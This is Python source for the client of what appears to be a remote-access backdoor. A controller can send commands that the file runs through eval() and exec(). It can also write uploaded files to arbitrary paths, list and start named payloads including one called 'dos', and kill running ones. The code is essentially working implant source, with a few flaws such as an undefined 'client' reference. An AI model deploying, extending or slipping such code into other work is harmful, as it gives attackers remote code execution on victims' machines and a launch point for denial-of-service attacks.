from customThreading import KillableThread
from socketHelpers.client import Client
from socketHelpers.packet import Packet

import os
import time

import payloads.dos
import payloads.test
import payloads.minvolume
import payloads.maxvolume

paylds = [payloads.dos, payloads.test, payloads.minvolume, payloads.maxvolume]
PAYLOADS = {str(x.__name__).split(".")[1]:x for x in paylds}


class PayloadPlayer(KillableThread):
    def __init__(self, payload, manager=None):
        super().__init__()
        self.payload = payload
        self.manager = manager
        self.starttime = 0

    def __repr__(self):
        t = time.strftime("%j %H:%M:%S", time.gmtime( time.time() - (time.time() if self.starttime == 0 else self.starttime) )).split(" ")
        return "PayloadPlayer(%s, %s days %s)"%(self.payload.__name__, int(t[0])-1, t[1])

    def run(self):
        self.starttime = time.time()
        if self.manager : self.manager.activePayloads[self.payload.__name__.split(".")[1]] = self
        self.payload.execute(self)

    def error(self, e):
        if self.manager: return self.manager.send(Packet("info", str(e)))
        print("paylod error: %s"%e)

    def execute(self, data):
        self.data = data
        if self.payload.RETURNS: return self.payload.execute(self)
        self.start()

        return "Started execution of '%s'."%self.payload



class Client(Client):
    activePayloads = {}
    events = {}
    file_buffer = ""


    def event(self, packet_id):
        def event_decorator(func):
            self.events[packet_id] = func
            return func
        return event_decorator

    def handle(self, packet):
        self.events.get(packet.get_id(), lambda x, y: (x, y))(self, packet)

    def __init__(self, host, port):
        @self.event("ping")
        def event_ping(self, packet):
            self.send(Packet("pong"))

        @self.event("execute_list")
        def event_execute_list(self, packet):
            self.send(Packet("execute", str(list(PAYLOADS.keys()))))

        @self.event("execute")
        def event_execute(self, packet):
            try:
                data = PayloadPlayer(PAYLOADS[packet.read().split(" ")[0]], client).execute(packet.read())
            except KeyError:
                self.send(Packet("info", "Can not find payload %s."%packet.read()))
            else:
                self.send(Packet("info", data))

        @self.event("cmd")
        def event_cmd(self, packet):
            try:
                data = eval(packet.read())
                self.send(Packet("info", str(data)))
            except Exception as e:
                self.send(Packet("info", str("%s: %s"%(type(e), e))))

            try:
                exec(packet.read())
                self.send(Packet("info", str("Run on exec")))
            except Exception as e:
                self.send(Packet("info", str("%s: %s"%(type(e), e))))

        @self.event("new_file")
        def event_new_file(self, packet):
            name = packet.read()
            self.file_buffer = name

            os.makedirs("." if os.path.dirname(name) == "" else os.path.dirname(name), exist_ok=True)
            with open(name, "w") as f:
                f.close()

            self.send(Packet("info", "Recieving file '%s'."%name))

        @self.event("file_data")
        def event_file_data(self, packet):
            data = packet.read_raw()

            with open(self.file_buffer, "ab") as f:
                f.write(data)
                f.close()

        @self.event("cleaner")
        def event_cleaner(self, packet):
            self.send(Packet("active", str(self.activePayloads)))

        @self.event("active")
        def event_active(self, packet):
            for i in self.activePayloads:
                self.activePayloads[i].kill()

        @self.event("paykill")
        def event_paykill(self, packet):
            try:
                self.activePayloads[packet.read()].kill()
            except KeyError:
                self.send(Packet("info", "Can not find payload %s."%packet.read()))
            else:
                self.send(Packet("info", "Killed payload."))

        super().__init__(host, port)

#
# def get_client():
#     return client
#
#     client = Client("localhost", 2000)
#
#
#
#
